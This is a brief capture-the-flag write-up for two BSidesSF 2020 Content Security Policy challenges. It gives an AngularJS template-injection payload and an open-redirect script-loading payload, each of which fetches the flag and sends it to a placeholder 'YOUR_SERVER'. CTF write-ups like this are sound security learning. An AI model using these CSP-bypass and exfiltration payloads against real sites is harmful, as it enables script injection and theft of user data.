@@ -1,0 +1,25 @@
+# bsidessf-ctf-2020 https://szarny.hatenablog.com/
+
+# csp-2
+content-security-policy: 
+    script-src 'self' ajax.googleapis.com 'unsafe-eval'; 
+    default-src 'self' 'unsafe-inline'; 
+    connect-src *; 
+    report-uri /csp_report
+
+exploit:
+<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script> 
+<div class="ng-app"> {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} </div>
+
+# csp-3
+content-security-policy: 
+    script-src 'self' http://storage.googleapis.com/good.js; 
+    default-src 'self'; 
+    connect-src *; 
+    report-uri /csp_report
+
+create a firebase bucket to host my.js:
+fetch("https://csp-3-05637e51.challenges.bsidessf.net/csp-three-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))
+
+exploit:
+<script src="https://csp-3-05637e51.challenges.bsidessf.net/redirect?url=https://storage.googleapis.com/YOUR_BUCKET_NAME/exploit.js></script>
